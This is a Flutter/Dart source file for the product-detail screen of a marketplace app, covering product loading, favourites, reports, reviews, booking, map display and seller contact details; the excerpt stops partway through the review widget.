import 'dart:convert';
import 'dart:developer';
import 'dart:io';

import 'package:carousel_slider/carousel_slider.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:google_maps_flutter/google_maps_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:location/location.dart';
import 'package:provider/provider.dart';
import 'package:sevenemirates/components/apple_pay_widget.dart';
import 'package:sevenemirates/components/distance_calc.dart';
import 'package:sevenemirates/components/imagefullscreen.dart';
import 'package:sevenemirates/components/loading_placement.dart';
import 'package:sevenemirates/components/relative_scale.dart';
import 'package:sevenemirates/components/url_open.dart';
import 'package:sevenemirates/components/widget_help.dart';
import 'package:sevenemirates/layout/product_card.dart';
import 'package:sevenemirates/maps/map_screen.dart';
import 'package:sevenemirates/screen/user/chat_screen.dart';
import 'package:sevenemirates/screen/user/seller_profile.dart';
import 'package:sevenemirates/screen/user/user_booking_screen.dart';
import 'package:sevenemirates/utils/currency_convert.dart';
import 'package:sevenemirates/utils/shared_preferences.dart';
import 'package:sevenemirates/utils/tap_payment_helper.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:zoom_widget/zoom_widget.dart';

import '../../components/custom_date.dart';
import '../../components/flashbar.dart';
import '../../components/image_viewer.dart';
import '../../components/progress_layout.dart';
import '../../components/rating_widget.dart';
import '../../router/open_screen.dart';
import '../../utils/app_settings.dart';
import '../../utils/const.dart';
import '../../utils/helper.dart';
import '../../utils/network_utils.dart';
import '../../utils/style_sheet.dart';
import '../../utils/translation_widget.dart';
import '../../utils/urls.dart';
import '../registration/phone_number.dart';

class ProductViewScreen extends StatefulWidget {
  String pid;
  String pname;
  String pimage;
  ProductViewScreen(
      {Key? key, required this.pid, required this.pname, required this.pimage})
      : super(key: key);

  @override
  State<ProductViewScreen> createState() => _ProductViewScreenState();
}

class _ProductViewScreenState extends State<ProductViewScreen>
    with RelativeScale {
  final _scaffoldKey = GlobalKey<ScaffoldMessengerState>();
  bool showProgress = false;
  bool showLikeProgress = false;
  String uId = '', name = '', skipSignup = '';
  Map data = Map();
  List productDetail = [];
  List productImages = [];
  List productVariant = [];
  List productColor = [];
  List fieldList = [];
  List relatedList = [];
  List reviewList = [];
  int liked = 0;

  int quantity = 1;
  String selectedVariant = '0';
  String selectedColor = '0';
  double selectedSellPrice = 0;
  double tax = 0;
  double deliveryCost = 0;
  double totalPrice = 0;

  bool buyPressed = false;

  String mapAddress = '', mapLat = '', mapLng = '', mapCity = '';
  late GoogleMapController _Mapcontroller;

  TextEditingController ETreview = TextEditingController();
  int Pstar = 0;
  bool showReview = false;
  bool showSuccess = false;

  TextEditingController ETaddress = TextEditingController();

  String _response = '';
  String _loading = "Loading...";
  var sessionIdValue = "";
  // late MFPaymentCardView mfPaymentCardView;
  @override
  void initState() {
    if (Const.PAYMENTGATEWAYAPITEST.isEmpty) {
      setState(() {
        _response =
            "Missing API Token Key.. You can get it from here: https://myfatoorah.readme.io/docs/test-token";
      });
      return;
    }
    // MFSDK.init(Const.PAYMENTGATEWAYAPITEST, MFCountry.UNITED_ARAB_EMIRATES,
    // MFEnvironment.TEST);
    // initiateSession();
    // MFSDK.setUpAppBar(isShowAppBar: true);

    super.initState();
    getSharedStore();
  }

  // void initiateSession() {
  //   MFSDK.initiateSession(
  //       null,
  //       (MFResult<MFInitiateSessionResponse> result) => {
  //             if (result.isSuccess())
  //               {
  //                 mfPaymentCardView.load(result.response!),
  //                 print(result.response.toString()),
  //                 //loadApplePay(result.response!)
  //               }
  //             else
  //               {
  //                 setState(() {
  //                   print("Response: " +
  //                       result.error!.toJson().toString().toString());
  //                   _response = result.error!.message!;
  //                 })
  //               }
  //           });
  // }

  // void executeRegularPayment() {
  //   // The value 1 is the paymentMethodId of KNET payment method.
  //   // You should call the "initiatePayment" API to can get this id and the ids of all other payment methods
  //   int paymentMethod = 6;

  //   var request =
  //       new MFExecutePaymentRequest(paymentMethod, double.parse(getTotal()));

  //   MFSDK.executePayment(context, request, MFAPILanguage.EN,
  //       onInvoiceCreated: (String invoiceId) =>
  //           {print("invoiceId: " + invoiceId)},
  //       onPaymentResponse: (String invoiceId,
  //               MFResult<MFPaymentStatusResponse> result) =>
  //           {
  //             if (result.isSuccess())
  //               {
  //                 setState(() {
  //                   print("invoiceId: " + invoiceId);
  //                   print("Response: " + result.response!.toJson().toString());
  //                   _response = result.response!.toJson().toString().toString();
  //                   _booking('PAID', invoiceId.toString());
  //                 })
  //               }
  //             else
  //               {
  //                 setState(() {
  //                   print("invoiceId: " + invoiceId);
  //                   print("Response: " + result.error!.toJson().toString());
  //                   _response = result.error!.message!;
  //                   //_PreBooking('PAID${invoiceId.toString()}');
  //                   //_booking('Failed', invoiceId.toString());
  //                   Pop.errorTop(context, 'Payment Failed', Icons.warning);
  //                 })
  //               }
  //           });

  //   setState(() {
  //     _response = _loading;
  //   });
  // }

  @override
  void dispose() {
    super.dispose();
  }

  getSharedStore() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    setState(() {
      uId = prefs.getString(Const.UID) ?? '';
      name = prefs.getString(Const.NAME) ?? '';
      skipSignup = prefs.getString(Const.SKIP_SIGNUP_VALUE) ?? '0';

      mapAddress = Provider.of<AppSetting>(context, listen: false).mapAddress;
      mapLat = Provider.of<AppSetting>(context, listen: false).maplat;
      mapLng = Provider.of<AppSetting>(context, listen: false).maplon;
      mapCity = Provider.of<AppSetting>(context, listen: false).mapCity;
      ETaddress.text =
          Provider.of<AppSetting>(context, listen: false).mapAddress;
    });

    _getProduct();
  }

  _getProduct() async {
    debugPrint("uid--" + uId.toString());
    debugPrint("pid--" + widget.pid.toString());
    showProgress = true;
    final response = await http.post(Uri.parse(Urls.ProductView),
        headers: {HttpHeaders.acceptHeader: Const.POSTHEADER},
        body: {"key": Const.APPKEY, "uid": uId, "pid": widget.pid});
    data = json.decode(response.body);

    debugPrint("Request--" + response.request.toString());

    setState(() {
      showProgress = false;
      if (data["success"] == true) {
        productDetail = data["products"];
        productImages = data["images"];
        productVariant = data["size"];
        productColor = data["color"];
        fieldList = data["fields"];

        relatedList = data["related"];
        reviewList = data["reviews"];
        liked = int.parse(data["likes"].toString());

        selectedSellPrice = double.parse(productDetail[0]['p_sell']);
      } else {
        Pop.errorTop(
            context, Lang("Something wrong", "حدث خطأ ما"), Icons.warning);
      }
    });
  }

  _likeRequest() async {
    setState(() {
      showLikeProgress = true;
    });

    final response = await http.post(Uri.parse(Urls.AddLike),
        headers: {HttpHeaders.acceptHeader: Const.POSTHEADER},
        body: {"key": Const.APPKEY, "uid": uId, "pid": widget.pid});
    data = json.decode(response.body);

    debugPrint("Request--" + response.request.toString());
    debugPrint("Response--" + response.body.toString());

    setState(() {
      showLikeProgress = false;
      if (data["success"] == true) {
        if (data["action"] == "deleted") {
          setState(() {
            liked = 0;
            Pop.successTop(
                context,
                Lang('Product added to favourite list',
                    "تمت إضافة المنتج إلى قائمة المفضلة"),
                Icons.favorite_border);
          });
        } else {
          setState(() {
            liked = 1;
            Pop.successTop(
                context,
                Lang('Product removed from favourite list',
                    "تمت إزالة المنتج من قائمة المفضلة"),
                Icons.favorite);
          });
        }
      } else {
        Pop.errorTop(
            context, Lang("Something wrong", "حدث خطأ ما"), Icons.warning);
      }
    });
  }

  _addReport(String id) async {
    final response = await http.post(Uri.parse(Urls.AddReport), headers: {
      HttpHeaders.acceptHeader: Const.POSTHEADER
    }, body: {
      "key": Const.APPKEY,
      "uid": uId,
      "pid": widget.pid,
      "rid": id,
    });
    data = json.decode(response.body);

    debugPrint("Request--" + response.request.toString());
    debugPrint("Response--" + data.toString());

    setState(() {
      if (data["success"] == true) {
        Pop.successPop(
            context,
            Lang("Report Submitted  ", "تم إرسال التقرير  "),
            Lang(
                "In case of true evidence, we will take action with in 24 hours  ",
                " في حالة وجود دليل حقيقي ، سنتخذ إجراءً خلال 24 ساعة "),
            Icons.check);
      } else {
        Pop.errorTop(
            context, Lang("Something wrong", "حدث خطأ ما"), Icons.warning);
      }
    });
  }

  _booking(String Method, String Trans) async {
    setState(() {
      showLikeProgress = true;
    });
    var body = {
      "key": Const.APPKEY,
      "uid": uId,
      "pid": widget.pid,
      "sid": productDetail[0]['u_id'],
      "variant": selectedVariant.toString(),
      "color": selectedColor.toString(),
      "method": Method.toString(),
      "quantity": quantity.toString(),
      "price": selectedSellPrice.toString(),
      "tax": getTax().toString(),
      "delivery_cost": deliveryCost.toString(),
      "total_price": getTotal().toString(),
      "address": ETaddress.text.toString(),
      "city": mapCity.toString(),
      "map": mapLat.toString() + ',' + mapLng.toString(),
    };

    final response = await http.post(Uri.parse(Urls.AddBooking),
        headers: {HttpHeaders.acceptHeader: Const.POSTHEADER}, body: body);
    debugPrint("Request--" + response.request.toString());
    data = json.decode(response.body);

    debugPrint("Response--" + response.body.toString());

    setState(() {
      showLikeProgress = false;
      if (data["success"] == true) {
        showSuccess = true;
        buyPressed = false;
      } else {
        Pop.errorTop(
            context, Lang("Something wrong", "حدث خطأ ما"), Icons.warning);
      }
    });
  }

  _addReview() async {
    var body = {
      "key": Const.APPKEY,
      "uid": uId.toString(),
      "pid": widget.pid.toString(),
      "star": Pstar.toString(),
      "detail": ETreview.text.toString(),
    };
    debugPrint(body.toString());
    setState(() {
      showProgress = true;
    });
    final response = await http.post(Uri.parse(Urls.AddReview),
        headers: {HttpHeaders.acceptHeader: Const.POSTHEADER}, body: body);

    data = json.decode(response.body);

    setState(() {
      showProgress = false;
    });
    setState(() {
      if (data["success"] == true) {
        showReview = false;
        Pstar = 0;
        ETreview.text = "";
        Pop.successTop(
            context,
            Lang(" Review successfully submited ", "تم إرسال المراجعة بنجاح  "),
            Icons.warning);
      } else {
        Pop.errorTop(
            context, Lang("Something wrong", "حدث خطأ ما"), Icons.warning);
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    initRelativeScaler(context);
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      themeMode: Provider.of<AppSetting>(context).appTheam,
      theme: MyThemes.lightTheme,
      darkTheme: MyThemes.darkTheme,
      builder: (context, child) {
        return Directionality(
          textDirection:
              Const.AppLanguage == 0 ? TextDirection.ltr : TextDirection.rtl,
          child: child!,
        );
      },
      home: Container(
        color: fc_bg,
        child: ScaffoldMessenger(
          key: _scaffoldKey,
          child: SafeArea(
            // top: false,
            child: Scaffold(
                backgroundColor: Colors.white,
                body: Container(
                    width: Width(context),
                    height: Height(context),
                    child: Stack(
                      children: [
                        Positioned(
                          child: CustomScrollView(
                            slivers: [
                              SliverPersistentHeader(
                                delegate: TopTitleBar(
                                    productImage: widget.pimage,
                                    productName: widget.pname,
                                    expandedHeight: Width(context) * 0.8,
                                    backBtn: GestureDetector(
                                      behavior: HitTestBehavior.translucent,
                                      onTap: () {
                                        Navigator.of(context).pop(true);
                                        // Navigator.of(context, rootNavigator: true).pop(context);
                                      },
                                      child: Material(
                                        color: Colors.black12,
                                        elevation: 1,
                                        borderRadius:
                                            BorderRadius.circular(sy(30)),
                                        child: Container(
                                          width: sy(25),
                                          height: sy(25),
                                          alignment: Alignment.center,
                                          padding: EdgeInsets.fromLTRB(
                                              sy(5), sy(0), sy(5), sy(0)),
                                          child: Icon(
                                            Icons.arrow_back,
                                            color: fc_bg,
                                            size: sy(l),
                                          ),
                                        ),
                                      ),
                                    ),
                                    favBtn: GestureDetector(
                                      onTap: () {
                                        if (skipSignup == '1' || uId == '0') {
                                          Navigator.push(
                                              context,
                                              OpenScreen(
                                                  widget: PhoneNumberScreen()));
                                        } else {
                                          _likeRequest();
                                        }
                                      },
                                      child: Container(
                                        child: (showLikeProgress == false)
                                            ? Icon(
                                                (liked == 0)
                                                    ? Icons.favorite_border
                                                    : Icons.favorite,
                                                size: sy(17),
                                                color: (liked == 0)
                                                    ? fc_4
                                                    : Colors.red[500],
                                              )
                                            : Container(
                                                width: sy(10),
                                                height: sy(10),
                                                padding: EdgeInsets.all(sy(3)),
                                                child: CircularProgressIndicator(
                                                    strokeWidth: sy(1),
                                                    valueColor:
                                                        new AlwaysStoppedAnimation<
                                                                Color>(
                                                            TheamPrimary)),
                                              ),
                                      ),
                                    ),
                                    shareBtn: GestureDetector(
                                      onTap: () {
                                        UrlOpenUtils.share(
                                            _scaffoldKey,
                                            Urls.ShareURL +
                                                'id=' +
                                                widget.pid +
                                                "&name=" +
                                                widget.pname);
                                      },
                                      child: Icon(
                                        Icons.share,
                                        color: fc_4,
                                        size: sy(15),
                                      ),
                                    ),
                                    productImages: productImages,
                                    productDetail: productDetail,
                                    bcontext: context),
                                pinned: true,
                              ),
                              SliverToBoxAdapter(
                                child: (productDetail.length != 0)
                                    ? screenBody()
                                    : LoadingPlacement(
                                        width: Width(context),
                                        height: Width(context)),
                              )
                            ],
                          ),
                          top: 0,
                          bottom: 0,
                          left: 0,
                          right: 0,
                        ),
                        if (buyPressed == true)
                          Positioned(
                            child: cartWidget(),
                            bottom: sy(0),
                            left: sy(0),
                            right: sy(0),
                            top: sy(0),
                          ),
                        if (showSuccess == true)
                          Positioned(
                            child: paymentSuccess(),
                            top: 0,
                            bottom: 0,
                            left: 0,
                            right: 0,
                          ),
                      ],
                    ))),
          ),
        ),
      ),
    );
  }

  screenBody() {
    return Container(
      width: Width(context),
      color: fc_bg_mild,
      child: SingleChildScrollView(
        // physics: BouncingScrollPhysics(),
        scrollDirection: Axis.vertical,
        child: Column(
            mainAxisAlignment: MainAxisAlignment.start,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              actionButton(),
              SizedBox(
                height: sy(10),
              ),
              priceWidget(),
              SizedBox(
                height: sy(10),
              ),
              if (productVariant.length != 0) variantBlockNew(),
              if (productColor.length != 0) colorBlockNew(),
              SizedBox(
                height: sy(10),
              ),
              if (productDetail[0]['c_id'] != Const.COMMUNITY_ID &&
                  fieldList.length != 0)
                titleCard(Lang('Insights', 'أفكار')),
              if (productDetail[0]['c_id'] != Const.COMMUNITY_ID &&
                  fieldList.length != 0)
                insightWidget(),
              titleCard(Lang("Description  ", " وصف ")),
              detailWidget(),
              SizedBox(
                height: sy(10),
              ),
              if (productImages.length != 0) imageBlock(),
              SizedBox(
                height: sy(10),
              ),
              titleCard(Lang("More about this  ", " المزيد عن هذا ")),
              moreWidget(),
              SizedBox(
                height: sy(10),
              ),
              titleCard(Lang("Map Location  ", " خريطة الموقع ")),
              mapWidget(),
              reviewWidget(),
              titleCard(Lang(" Related Post ", "منشور ذات صلة  ")),
              relatedWidget(),
              reportWidget(),
              SizedBox(
                height: sy(10),
              ),
              MyProgressLayout(showProgress),
              SizedBox(
                height: sy(10),
              ),
            ]),
      ),
    );
  }

  bool viewReport = false;
  reportWidget() {
    return Container(
      width: Width(context),
      padding: EdgeInsets.fromLTRB(sy(15), sy(15), sy(5), sy(5)),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.start,
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          GestureDetector(
              onTap: () {
                setState(() {
                  viewReport = !viewReport;
                });
              },
              child: Column(
                mainAxisAlignment: MainAxisAlignment.start,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    mainAxisAlignment: MainAxisAlignment.start,
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        Lang(" Report this post ", " الإبلاغ عن هذا المنشور "),
                        style: ts_Bold(sy(n), fc_2),
                      ),
                      SizedBox(
                        width: sy(5),
                      ),
                      Icon(
                        Icons.info,
                        size: sy(n),
                        color: fc_4,
                      )
                    ],
                  ),
                  SizedBox(
                    height: sy(5),
                  ),
                  Text(
                    Lang(
                        " Having problem with this post? click here to report this post  ",
                        "هل تواجه مشكلة مع هذا المنشور؟ انقر هنا للإبلاغ عن هذا المنصب  "),
                    style: ts_Regular(sy(s), fc_2),
                  ),
                  SizedBox(
                    height: sy(10),
                  ),
                ],
              )),
          for (int i = 0; i < Const.ReportList.length; i++)
            if (viewReport == true)
              GestureDetector(
                onTap: () {
                  setState(() {
                    _addReport(Const.ReportList[i]['id'].toString());
                    viewReport = false;
                  });
                },
                child: Container(
                  color: Colors.white,
                  padding: EdgeInsets.fromLTRB(sy(10), sy(5), sy(10), sy(5)),
                  margin: EdgeInsets.fromLTRB(sy(0), sy(1), sy(0), sy(1)),
                  width: MediaQuery.of(context).size.width,
                  //height: MediaQuery.of(context).size.width*0.29,
                  child: Text(
                    Const.ReportList[i]["label$cur_Lang"],
                    style: ts_Regular(sy(n), fc_2),
                  ),
                ),
              ),
        ],
      ),
    );
  }

  imageBlock() {
    return Container(
      width: Width(context),
      // margin:EdgeInsets.fromLTRB(sy(10), sy(0), sy(10), sy(10)),
      padding: EdgeInsets.fromLTRB(sy(0), sy(0), sy(0), sy(0)),
      alignment: Alignment.topLeft,
      child: Column(
        mainAxisAlignment: MainAxisAlignment.start,
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Wrap(
            alignment: WrapAlignment.start,
            children: [
              for (int i = 0; i < productImages.length; i++)
                GestureDetector(
                    onTap: () {
                      Navigator.push(
                          context,
                          OpenScreen(
                              widget: ImageFullScreen(
                            imgurl: Urls.imageLocation +
                                productImages[i]['pi_image'].toString(),
                          )));
                    },
                    child: Container(
                      width: Width(context) * 0.25,
                      height: Width(context) * 0.22,
                      padding: EdgeInsets.fromLTRB(sy(5), sy(0), sy(3), sy(5)),
                      child: CustomeImageView(
                        image: Urls.imageLocation +
                            productImages[i]['pi_image'].toString(),
                        width: Width(context) * 0.25,
                        height: Width(context) * 0.2,
                        radius: sy(2),
                        blurBackground: false,
                        fit: BoxFit.cover,
                      ),
                    )),
            ],
          ),
        ],
      ),
    );
  }

  mapWidget() {
    return Container(
      width: Width(context),
      child: Column(
        children: [
          Container(
              width: Width(context),
              height: Width(context) * 0.6,
              decoration: decoration_round(
                  Colors.grey.shade300, sy(5), sy(5), sy(5), sy(5)),
              padding: EdgeInsets.all(sy(1)),
              margin: EdgeInsets.fromLTRB(sy(10), sy(3), sy(10), sy(3)),
              child: Stack(
                children: [
                  Positioned(
                    child: ClipRRect(
                      borderRadius: BorderRadius.circular(sy(5)),
                      child: GoogleMap(
                        mapType: MapType.normal,
                        zoomControlsEnabled: false,
                        // markers:<Marker>[
                        //   Marker(
                        //       markerId: MarkerId("Point"),
                        //       position: LatLng(double.parse(productDetail[0]['p_lat'].toString()), double.parse(productDetail[0]['p_lng'].toString())),
                        //       icon: BitmapDescriptor.defaultMarker,
                        //       infoWindow: InfoWindow(title: "Point")
                        //   ),
                        // ].toSet(),
                        initialCameraPosition: CameraPosition(
                          target: LatLng(
                              double.parse(
                                  productDetail[0]['p_lat'].toString()),
                              double.parse(
                                  productDetail[0]['p_lng'].toString())),
                          zoom: 15.0,
                        ),
                        onMapCreated: (GoogleMapController controller) {
                          changeMapMode();

                          _Mapcontroller = controller;
                        },
                      ),
                    ),
                    top: 0,
                    bottom: 0,
                    right: 0,
                    left: 0,
                  ),
                  Align(
                    alignment: Alignment.center,
                    child: Icon(
                      Icons.place,
                      size: sy(xxl + 5),
                      color: TheamPrimary,
                    ),
                  )
                ],
              )),
          Container(
            margin: EdgeInsets.fromLTRB(sy(10), sy(3), sy(10), sy(3)),
            child: TranslationWidget(
              message: productDetail[0]['p_address'],
              style: ts_Regular(sy(s), fc_3),
            ),
          ),
          SizedBox(
            height: sy(10),
          ),
        ],
      ),
    );
  }

  changeMapMode() async {
    getJsonFile("assets/images/vehiclemapstyle.json").then(setMapStyle);
  }

  Future<String> getJsonFile(String path) async {
    return await rootBundle.loadString(path);
  }

  void setMapStyle(String mapStyle) {
    _Mapcontroller.setMapStyle(mapStyle);
  }

  actionButton() {
    return Container(
        width: Width(context),
        color: fc_bg,
        padding: EdgeInsets.fromLTRB(sy(10), sy(10), sy(10), sy(10)),
        child: SingleChildScrollView(
          scrollDirection: Axis.horizontal,
          child: Row(
            mainAxisAlignment: MainAxisAlignment.start,
            children: [
              GestureDetector(
                child: tabbutton(Icons.add_call, Lang('Call', 'اتصال')),
                onTap: () {
                  UrlOpenUtils.call(
                      _scaffoldKey,
                      productDetail[0]['country_id'] +
                          productDetail[0]['phone']);
                  //Navigator.push(context, OpenScreen(widget: SellerProfileScreen(seller: productDetail[0]['u_id'],)));
                },
              ),
              if (productDetail[0]['is_service'] == '1')
                GestureDetector(
                  child: tabbutton(FontAwesomeIcons.whatsapp, 'whatsapp'),
                  onTap: () {
                    UrlOpenUtils.whatsappShop(
                        _scaffoldKey,
                        productDetail[0]['country_id'] +
                            productDetail[0]['phone']);
                  },
                ),
              GestureDetector(
                child:
                    tabbutton(Icons.chat_bubble_outline, Lang('Chat', 'دردشة')),
                onTap: () {
                  Navigator.push(
                      context,
                      OpenScreen(
                          widget: ChatScreen(
                        opImage: productDetail[0]['profile_pic'].toString(),
                        opName: productDetail[0]['name'].toString(),
                        opId: productDetail[0]['u_id'],
                        pid: productDetail[0]['p_id'],
                        pname: productDetail[0]['p_title'].toString(),
                        pimage: productDetail[0]['p_image'].toString(),
                      )));
                },
              ),
              if (productDetail[0]['is_service'] == '0')
                GestureDetector(
                  child: tabbutton(Icons.shopping_cart_checkout_outlined,
                      Lang('Buy', 'شراء')),
                  onTap: () {
                    setState(() {
                      if (productDetail[0]['p_status'] == 'A') {
                        if (productVariant.length == 0 && productColor == 0) {
                          buyPressed = true;
                        } else {
                          if (productVariant.length != 0 &&
                              selectedVariant == '0') {
                            Pop.errorTop(
                                context,
                                Lang('Please select variant',
                                    "الرجاء تحديد البديل"),
                                Icons.warning_rounded);
                          } else {
                            if (productColor.length != 0 &&
                                selectedColor == '0') {
                              Pop.errorTop(
                                  context,
                                  Lang('Please select color',
                                      "الرجاء تحديد اللون"),
                                  Icons.warning_rounded);
                            } else {
                              buyPressed = true;
                            }
                          }
                        }
                      } else {
                        Pop.errorTop(
                            context,
                            Lang(
                                'Product not available now or may be out of stock',
                                "المنتج غير متوفر الآن أو قد يكون نفد من المخزن"),
                            Icons.warning);
                      }
                    });
                  },
                ),
            ],
          ),
        ));
  }

  priceWidget() {
    return Container(
      margin: EdgeInsets.fromLTRB(sy(10), sy(3), sy(10), sy(3)),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.start,
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.start,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Expanded(
                  child: Column(
                mainAxisAlignment: MainAxisAlignment.start,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    widget.pname,
                    style: ts_Bold(sy(l), fc_2),
                  ),
                  if (productDetail[0]['p_status'] == 'A')
                    Container(
                      decoration: decoration_round(
                          Colors.green.shade50, sy(3), sy(3), sy(3), sy(3)),
                      child: Text(
                        Lang("Verified  ", " تم التحقق "),
                        style: ts_Regular(sy(s - 1), Colors.green),
                      ),
                      padding: EdgeInsets.fromLTRB(sy(5), sy(2), sy(5), sy(2)),
                      margin: EdgeInsets.fromLTRB(sy(0), sy(4), sy(0), sy(2)),
                    ),
                  SizedBox(
                    height: sy(5),
                  ),
                  Row(
                    children: [
                      Text(
                        productDetail[0]["c_name$cur_Lang"].toString(),
                        style: ts_Regular(sy(s), fc_2),
                      ),
                      SizedBox(
                        width: sy(5),
                      ),
                      Icon(
                        Icons.arrow_right,
                        size: sy(n + 1),
                        color: fc_3,
                      ),
                      SizedBox(
                        width: sy(3),
                      ),
                      Text(
                        productDetail[0]["sc_title$cur_Lang"].toString(),
                        style: ts_Regular(sy(s), fc_2),
                      ),
                    ],
                  ),
                ],
              )),
              SizedBox(
                width: sy(5),
              ),
              Column(
                mainAxisAlignment: MainAxisAlignment.start,
                crossAxisAlignment: CrossAxisAlignment.end,
                children: [
                  Text(
                    PriceUtils.convert(selectedSellPrice.toString()),
                    style: ts_Bold(sy(l), TheamSecondary),
                  ),
                  SizedBox(
                    height: sy(3),
                  ),
                  if (productDetail[0]['c_id'] != Const.JOBS_ID)
                    Text(
                      productDetail[0]["p_quantity"] +
                          ' ' +
                          productDetail[0]["p_unit$cur_Lang"],
                      style: ts_Regular(sy(s), fc_4),
                    ),
                  if (productDetail[0]['c_id'] == Const.JOBS_ID)
                    Text(
                      Lang(" Monthly Package ", "الباقة الشهرية  "),
                      style: ts_Regular(sy(s), fc_4),
                    ),
                ],
              )
            ],
          ),
        ],
      ),
    );
  }

  insightWidget() {
    return Container(
      width: Width(context),
      margin: EdgeInsets.fromLTRB(sy(10), sy(0), sy(10), sy(10)),
      decoration: decoration_round(fc_bg, sy(5), sy(5), sy(5), sy(5)),
      padding: EdgeInsets.fromLTRB(sy(0), sy(5), sy(0), sy(5)),
      alignment: Alignment.center,
      child: Column(
        children: [
          for (int i = 0; i < fieldList.length; i++)
            Container(
                alignment: Alignment.center,
                // padding: EdgeInsets.fromLTRB(sy(5), sy(5), sy(5), sy(5)),
                padding: EdgeInsets.fromLTRB(sy(5), sy(5), sy(5), sy(5)),
                decoration: decoration_border(
                    fc_bg, fc_bg, 0.0, sy(15), sy(15), sy(15), sy(15)),
                child: Column(
                  children: [
                    Row(
                      mainAxisAlignment: MainAxisAlignment.start,
                      children: [
                        ClipRRect(
                            borderRadius: BorderRadius.circular(sy(0)),
                            child: CustomeImageView(
                              image: Urls.imageLocation +
                                  fieldList[i]['f_image'].toString(),
                              placeholder: Urls.DummyImageBanner,
                              fit: BoxFit.cover,
                              blurBackground: false,
                              imgColor: fc_3!,
                              height: sy(17),
                              width: sy(17),
                            )),
                        SizedBox(
                          width: sy(10),
                        ),
                        Text(
                          fieldList[i]['f_title$cur_Lang'].toString(),
                          style: ts_Regular(sy(n - 1), fc_3),
                        ),
                        Spacer(),
                        TranslationWidget(
                          message: fieldList[i]['f_ans'].toString(),
                          style: ts_Regular(sy(n - 1), fc_2),
                        ),
                      ],
                    ),
                    if (i != fieldList.length - 1)
                      Container(
                        color: Colors.grey.shade200,
                        width: Width(context),
                        height: sy(1),
                        margin: EdgeInsets.fromLTRB(sy(0), sy(7), sy(0), sy(0)),
                      )
                  ],
                ))
        ],
      ),
    );
  }

  moreWidget() {
    return Container(
      width: Width(context),
      margin: EdgeInsets.fromLTRB(sy(10), sy(0), sy(10), sy(10)),
      decoration: decoration_round(fc_bg, sy(5), sy(5), sy(5), sy(5)),
      padding: EdgeInsets.fromLTRB(sy(0), sy(5), sy(0), sy(5)),
      alignment: Alignment.center,
      child: Column(
        children: [
          cardMoreDetail(
              Lang('Post ID', 'بعد معرف'), '7EP0' + productDetail[0]['p_id']),
          divLine(sy(3), sy(3)),
          cardMoreDetail(
              Lang('Category', 'فئة'), productDetail[0]['c_name$cur_Lang']),
          divLine(sy(3), sy(3)),
          cardMoreDetail(Lang('Classification', 'تصنيف'),
              productDetail[0]['sc_title$cur_Lang']),
          divLine(sy(3), sy(3)),
          cardMoreDetail(
              Lang('Host Name', "اسم المضيف"), productDetail[0]['name']),
          divLine(sy(3), sy(3)),
          cardMoreDetail(Lang('Host ID', "معرف المضيف"),
              '7EU0' + productDetail[0]['u_id']),
          divLine(sy(3), sy(3)),
          cardMoreDetail(
              Lang('Phone', 'رقم الهاتف'), productDetail[0]['phone']),
          divLine(sy(3), sy(3)),
          cardMoreDetail(
              Lang('Email', 'البريد الإلكتروني'), productDetail[0]['email']),
          divLine(sy(3), sy(3)),
          cardMoreDetail(Lang('City', 'مدينة'), productDetail[0]['p_city']),
          divLine(sy(3), sy(3)),
          cardMoreDetail(
              Lang('Distance', 'مسافه: '),
              DistanceCalc.map(context,
                  productDetail[0]['p_lat'] + ',' + productDetail[0]['p_lng'])),
        ],
      ),
    );
  }

  reviewWidget() {
    return Container(
      width: Width(context),
      margin: EdgeInsets.fromLTRB(sy(10), sy(5), sy(10), sy(10)),
      // decoration: decoration_round(fc_bg, sy(5), sy(5), sy(5), sy(5)),
      padding: EdgeInsets.fromLTRB(sy(0), sy(5), sy(0), sy(0)),
      alignment: Alignment.center,
      child: Column(
        children: [
          Row(
            children: [
              Expanded(
                child: Text(
                  Lang("Reviews  ", " المراجعات "),
                  style: ts_Bold(sy(n), fc_3),
                ),
              ),
              GestureDetector(
                behavior: HitTestBehavior.translucent,
                onTap: () {
                  setState(() {
                    if (skipSignup == '1' || uId == '0') {
                      Navigator.push(
                          context, OpenScreen(widget: PhoneNumberScreen()));
                    } else {
                      if (showReview == true) {
                        showReview = false;
                      } else {
                        showReview = true;
                      }
                    }
                  });
                },
                child: Text(
                  Lang("WRITE REVIEW  ", " أكتب مراجعة "),
                  style: ts_Regular(sy(s), Colors.blue),
                ),
              ),
            ],
          ),
          SizedBox(
            height: sy(15),
          ),
          if (showReview == true) writeReviewWidget(),
          for (int i = 0; i < reviewList.length && i < 20; i++)
            GestureDetector(
              onTap: () {},
              child: Container(
                padding: EdgeInsets.fromLTRB(sy(5), sy(5), sy(5), sy(0)),
                decoration: decoration_round(fc_bg, sy(5), sy(5), sy(5), sy(5)),
                width: Width(context),
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.start,
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      mainAxisAlignment: MainAxisAlignment.start,
                      crossAxisAlignment: CrossAxisAlignment.center,
                      children: [
                        WidgetHelp.profilePic(reviewList[i]['profile_pic'],
                            reviewList[i]['name'], sy(30), sy(30), sy(30)),
                        SizedBox(
                          width: sy(8),
                        ),
                        Expanded(
                          child: Column(
                            mainAxisAlignment: MainAxisAlignment.start,
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              TranslationWidget(
                                message: reviewList[i]['name'],
                                style: ts_Bold(sy(n), fc_2),
                              ),
                              SizedBox(
                                height: sy(2),
                              ),
                              Text(
                                CustomeDate.dateTime(reviewList[i]['r_dated']),
